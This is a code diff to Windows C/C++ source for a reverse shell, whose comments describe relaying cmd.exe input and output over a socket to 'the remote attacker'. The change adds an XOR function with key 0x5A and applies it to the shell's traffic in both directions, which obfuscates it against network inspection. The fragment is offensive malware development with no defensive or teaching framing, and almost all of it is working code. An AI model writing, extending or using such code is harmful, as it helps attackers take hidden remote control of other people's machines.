@@ -8,6 +8,12 @@
 #pragma comment(lib, "Ws2_32.lib")
 #pragma warning(disable: 28251) // Ignore certain warning about HANDLEs in std::array
 
+void xor_buffer(char* buffer, int size, char key = 0x5A) 
+{
+    for (int i = 0; i < size; ++i)
+        buffer[i] ^= key;
+}
+
 // This thread reads output from the cmd.exe process and sends it back through the socket
 DWORD WINAPI ReadFromCmd(LPVOID lpParam)
 {
@@ -26,7 +32,8 @@ DWORD WINAPI ReadFromCmd(LPVOID lpParam)
             // Read from the pipe
             if (ReadFile(hStdOutRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0)
             {
-                // Send the output to the remote attacker
+				// Encrypt with XOR before sending
+                xor_buffer(buffer, bytesRead);
                 send(sockt, buffer, bytesRead, 0);
             }
         }
@@ -54,7 +61,8 @@ DWORD WINAPI WriteToCmd(LPVOID lpParam)
         recvSize = recv(sockt, buffer, sizeof(buffer), 0);
         if (recvSize > 0)
         {
-            // Write it to the input pipe (stdin for cmd)
+			// Encrypt with XOR before writing to stdin
+            xor_buffer(buffer, recvSize);
             WriteFile(hStdInWrite, buffer, recvSize, &bytesWritten, NULL);
         }
         else
